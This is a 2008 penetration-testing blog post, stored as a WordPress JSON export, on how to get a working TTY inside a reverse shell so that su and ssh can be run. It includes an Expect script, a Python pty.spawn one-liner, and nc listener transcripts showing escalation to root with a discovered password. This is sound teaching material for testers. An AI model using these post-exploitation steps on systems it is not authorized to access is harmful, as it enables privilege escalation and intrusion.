{"id":35,"date":"2008-01-16T22:08:59","date_gmt":"2008-01-16T22:08:59","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=35"},"modified":"2011-08-20T15:53:03","modified_gmt":"2011-08-20T15:53:03","slug":"post-exploitation-without-a-tty","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/blog\/post-exploitation-without-a-tty","title":{"rendered":"Post-Exploitation Without A TTY"},"content":{"rendered":"<p>This is a follow-up to a topic I touched on breifly <a href=\"http:\/\/pentestmonkey.net\/blog\/ssh-with-no-tty\/\">before<\/a> when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.\u00a0 I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get root because I couldn&#8217;t run &#8220;login&#8221; or &#8220;su&#8221;.\u00a0 Both of these required a TTY in order to work.<\/p>\n<p>I don&#8217;t present a definitive solution in this problem (if you have one please sent it in!).\u00a0 However I discuss a couple of approaches to getting a TTY&#8230;<\/p>\n<p><!--more--><\/p>\n<p>Post-exploitation activities during a pentest may involve using &#8220;su&#8221; to try and log into other local accounts, or using &#8220;ssh&#8221; to log into other hosts.<\/p>\n<h3>Using &#8220;Expect&#8221; To Get A TTY<\/h3>\n<p>If you&#8217;re lucky enough to have the <a href=\"http:\/\/en.wikipedia.org\/wiki\/Expect\">Expect<\/a> language installed just a few lines of code will get you a good enough TTY to run useful tools such as &#8220;ssh&#8221;, &#8220;su&#8221; and &#8220;login&#8221;.<\/p>\n<pre>$ cat sh.exp\r\n#!\/usr\/bin\/expect\r\n# Spawn a shell, then allow the user to interact with it.\r\n# The new shell will have a good enough TTY to run tools like ssh, su and login\r\nspawn sh\r\ninteract<\/pre>\n<p>The following output taken from a <a href=\"http:\/\/pentestmonkey.net\/tools\/php-reverse-shell\/\">reverse shell<\/a> demonstrates how &#8220;su&#8221; doesn&#8217;t work until we use the Expect script:<\/p>\n<pre>$ nc -v -n -l -p 1234\r\nlistening on [any] 1234 ...\r\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48257\r\nsh: no job control in this shell\r\nsh-3.2$ su -\r\nsu: must be run from a terminal\r\nsh-3.2$ expect sh.exp\r\nspawn sh\r\nsh-3.2$ su -\r\nPassword:\u00a0 mypassword\r\nlocalhost ~ #<\/pre>\n<p>Likewise, the ssh client doesn&#8217;t seem to work properly (with or without the -T option):<\/p>\n<pre>$ nc -v -n -l -p 1234\r\nlistening on [any] 1234 ...\r\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33250\r\nsh: no job control in this shell\r\nsh-3.2$ ssh localhost\r\nPseudo-terminal will not be allocated because stdin is not a terminal.\r\n&lt;big pause&gt;<\/pre>\n<pre>$ nc -v -n -l -p 1234\r\nlistening on [any] 1234 ...\r\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33252\r\nsh: no job control in this shell\r\nsh-3.2$ ssh -T localhost\r\n&lt;big pause&gt;<\/pre>\n<p>After we run sh.exp we are able to use the ssh client as normal:<\/p>\n<pre>$ nc -v -n -l -p 1234\r\nlistening on [any] 1234 ...\r\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43498\r\nsh: no job control in this shell\r\nsh-3.2$ expect sh.exp\r\nspawn sh\r\nsh-3.2$ ssh localhost\r\nssh localhost\r\nPassword: mypassword\r\nLast login: Wed Jan 16 13:43:20 2008 from 127.0.0.1\r\n\r\nuser@localhost ~ $<\/pre>\n<h3>Using Python To Get A TTY<\/h3>\n<p>This is quite an elegant solution I found on <a href=\"http:\/\/tero.marttila.de\/\">Tero&#8217;s glob<\/a>.\u00a0 It should be effective against gentoo systems at least because the gentoo package management runs on python.<\/p>\n<p>$ nc -v -n -l -p 1234<br \/>\nlistening on [any] 1234 &#8230;<br \/>\nsh: no job control in this shell<br \/>\nsh-3.2$ su &#8211;<br \/>\nsu: must be run from a terminal<br \/>\nsh-3.2$ python -c &#8216;import pty; pty.spawn(&#8220;\/bin\/sh&#8221;)&#8217;<br \/>\nsh-3.2$ su &#8211;<br \/>\nsu &#8211;<br \/>\nPassword:<br \/>\nlocalhost ~ #<\/p>\n<h3>Using PERL To Get A TTY<\/h3>\n<p>This is not such as great solution as IO::Pty isn&#8217;t installed by default on any system I&#8217;ve seen.\u00a0 For completeness, though:<\/p>\n<p>&lt;hmmm&#8230; can&#8217;t get it will working.\u00a0 Will post later.&gt;<\/p>\n<pre><\/pre>\n","protected":false},"excerpt":{"rendered":"<p>This is a follow-up to a topic I touched on breifly before when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.\u00a0 I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get [&hellip;]<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[5],"tags":[97,19,47,52,96],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/35"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=35"}],"version-history":[{"count":2,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/35\/revisions"}],"predecessor-version":[{"id":386,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/35\/revisions\/386"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=35"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=35"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=35"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}